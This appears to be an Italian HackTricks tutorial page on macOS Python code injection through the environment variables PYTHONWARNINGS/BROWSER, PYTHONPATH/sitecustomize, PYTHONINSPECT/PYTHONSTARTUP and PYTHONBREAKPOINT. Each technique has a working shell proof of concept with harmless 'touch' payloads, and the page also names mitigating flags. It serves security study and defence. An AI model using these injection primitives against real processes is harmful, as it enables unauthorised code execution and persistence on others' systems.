# Injection di applicazioni Python su macOS

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

Se un attacker può controllare l'ambiente di un processo Python, la combinazione di `PYTHONWARNINGS` e `BROWSER` può attivare l'esecuzione di comandi quando Python importa il modulo `antigravity` durante l'elaborazione di un'opzione di warning appositamente creata. Questa tecnica si basa su `antigravity` che apre un URL con il modulo `webbrowser` di Python, il quale rispetta la variabile d'ambiente `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Tramite `PYTHONPATH` e `sitecustomize.py`

Durante l'avvio normale, il modulo `site` di Python aggiunge percorsi specifici del sistema e poi prova a importare un modulo chiamato `sitecustomize`. Inserendo all'inizio di `PYTHONPATH` una directory leggibile dall'attaccante, chi controlla l'ambiente del processo può fare in modo che Python importi un payload prima dello script bersaglio. Il flag `-S` disabilita l'inizializzazione automatica di `site`, mentre la modalità isolata (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Per la persistenza tramite un site utente scrivibile anziché tramite un `PYTHONPATH` ereditato, consulta [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Tramite `PYTHONINSPECT` e `PYTHONSTARTUP` dopo uno script

Su CPython 3.13+, uno script avviato con `PYTHONINSPECT=1` entra in una sessione interattiva al termine dell'esecuzione. Se lo standard input è un terminale e PyREPL è disponibile, la sessione esegue il file indicato da `PYTHONSTARTUP` **dopo** lo script di destinazione e prima del prompt. Un aggressore che controlla entrambe le variabili ereditate e un file di startup leggibile può quindi eseguire codice nel processo di destinazione senza modificare il suo script. Si tratta di un trigger post-script, non di un normale hook di startup.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

La catena non esegue il file di avvio nelle versioni meno recenti di CPython, se l’input standard non è un terminale o se `PYTHONBASIC_REPL` forza la REPL di base. `-E` e `-I` ignorano le variabili `PYTHON*`. Verifica l’interprete effettivo e il contesto del terminale prima di fare affidamento su questo percorso.<sup>[[3]](#references)[[5]](#references)</sup>

## Tramite `PYTHONBREAKPOINT`

Da Python 3.7 (PEP 553), la funzione integrata `breakpoint()` importa e chiama ciò a cui punta `sys.breakpointhook`, e tale destinazione è determinata dalla variabile d’ambiente **`PYTHONBREAKPOINT`** (`package.module.callable`). Sia l’importazione del modulo indicato sia la chiamata al callable vengono eseguite prima che il debugger compaia normalmente: quindi, se un attaccante controlla l’ambiente di un processo che raggiunge una chiamata a `breakpoint()` (caso comune negli script di manutenzione/debug, talvolta lasciata anche nei percorsi di produzione), può eseguire codice.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

A differenza di `PYTHONWARNINGS`/`PYTHONPATH`, in questo caso il target deve effettivamente raggiungere una chiamata a `breakpoint()`, ma funziona anche solo tramite gli **effetti collaterali dell'importazione** del modulo indicato (impostalo su qualsiasi modulo importabile — per esempio uno posizionato per primo in `PYTHONPATH` — il cui codice di primo livello viene eseguito). Impostando `PYTHONBREAKPOINT=0` si disabilita completamente l'hook.



## References

- [1] [Hacking con le variabili d'ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook di configurazione specifico del sito](https://docs.python.org/3/library/site.html)
- [3] [Python: riga di comando e ambiente](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Funzione integrata breakpoint() e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Dispatch REPL dell'interprete CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Esecuzione del file di avvio di PyREPL in CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
